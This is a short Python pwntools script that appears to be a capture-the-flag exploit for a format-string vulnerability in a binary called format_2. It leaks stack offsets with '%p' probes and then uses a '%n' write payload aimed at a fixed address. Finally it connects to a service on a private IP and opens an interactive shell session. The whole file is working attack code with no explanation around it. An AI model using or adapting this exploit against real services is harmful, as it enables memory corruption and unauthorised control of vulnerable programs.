from pwn import *
import sys

def scan(r):
    with open("output","w") as f:
        for i in range(1,200):
            print(r.recvline())
            r.sendline("AAAA%%%d$p"%i)
            leak = r.recvline()
            f.write("%d => %s" %(i,leak))
            r.close()
def exploit(r):
    # print(r.recvline())
    # print("-------------------")
    payload = p32(0x0804a04c)
    payload += "%2016u%4$n"
    # print(payload)
    # payload = p32(0x0804a04c)
    # payload += "%x.%x.%x.%x.%x.%x"
    r.sendline(payload)
    r.interactive()
    return
if __name__ == "__main__":
    #r = process("./format_2")
    r = connect("192.168.19.105",1111)
    exploit(r)





